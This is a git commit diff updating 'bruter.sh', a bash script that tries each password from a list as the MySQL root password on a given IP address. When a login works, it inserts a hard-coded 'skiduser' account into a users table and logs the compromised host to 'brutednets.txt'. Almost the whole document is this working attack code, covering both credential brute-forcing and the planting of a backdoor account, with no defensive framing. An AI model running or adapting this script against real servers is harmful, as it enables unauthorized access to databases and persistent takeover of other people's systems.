d2546fb7b2c9118ebc9b15084a04053ddd4082d5
TR4P$QU1D <68450182+TR4PSQU1D@users.noreply.github.com>
2020-09-14 07:27:15 +1000

    Update bruter.sh

--- bruter.sh
+++ bruter.sh
@@ -2,15 +2,20 @@
 filename=$1
 ip=$2
 passwds=(`cat "$filename"`)
+echo "Running"
 for i in "${passwds[@]}"
-do echo "Trying $i"
-  db=$(mysql -h $ip -u root -p$i -e "show databases;" | grep "\|" | grep -v "_schema" | grep -v "Database" | grep -v "mysql")
-  echo "Found Database: $db"
+do db=$(timeout 2 mysql -h $ip -u root -p$i -e "show databases;" | grep "\|" | grep -v "_schema" | grep -v "Database" | grep -v "mysql")
+  if [[ $db == *"not allowed"* ]]; then
+    echo "Bruting Failed."
+    exit 1
+  fi
   gdb=$(echo $db | tr -d '\040\011\012\015')
-  aa=$(mysql -h $ip -u root -p$i -e "use $gdb; INSERT INTO users VALUES (NULL, 'skiduser', 'skidpassword', 0, 0, 0, 0, -1, 1, 30, '');")
+  aa=$(timeout 3 mysql -h $ip -u root -p$i -e "use $gdb; INSERT INTO users VALUES (NULL, 'skiduser', 'skidpassword', 0, 0, 0, 0, -1, 1, 30, '');")
   if [[ $aa == *"Query OK"* ]]; then
     echo "$ip:skiduser:skidpassword" >> brutednets.txt
     echo "GOTTEM: $ip:skiduser:skidpassword"
     exit 1
   fi
 done
+echo "Bruting Failed."
+
